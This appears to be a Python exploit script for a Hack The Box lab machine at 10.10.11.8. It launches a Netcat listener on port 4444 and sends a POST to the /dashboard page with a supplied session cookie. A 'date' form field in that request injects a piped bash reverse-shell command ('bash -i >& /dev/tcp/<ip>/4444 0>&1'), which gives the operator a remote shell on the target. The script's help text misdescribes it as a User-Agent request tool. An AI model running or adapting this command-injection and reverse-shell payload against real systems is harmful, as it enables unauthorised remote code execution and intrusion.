import subprocess
import requests
import argparse
import time

# Parse command-line arguments
parser = argparse.ArgumentParser(description='Make an HTTP request with custom User-Agent header')
parser.add_argument('-htbip', type=str, help='HTB IP address', required=True)
parser.add_argument('-cookie', type=str, help='Cookie value', required=True)
args = parser.parse_args()

# Start Netcat listener in a separate process
nc_process = subprocess.Popen(["nc", "-lvp", "4444"])

# Wait for Netcat listener to start
time.sleep(1)

# Define the second HTTP request headers
second_headers = {
    'Host': '10.10.11.8:5000',
    'Content-Length': '74',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://10.10.11.8:5000',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://10.10.11.8:5000/dashboard',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': args.cookie,
    'Connection': 'close'
}

# Define the second HTTP request body
second_body = 'date=2023-09-2a15|bash+-c+"bash+-i+>%26+/dev/tcp/' + args.htbip + '/4444+0>%261"'

# Make the second HTTP request
second_url = 'http://10.10.11.8:5000/dashboard'
second_response = requests.post(second_url, headers=second_headers, data=second_body)
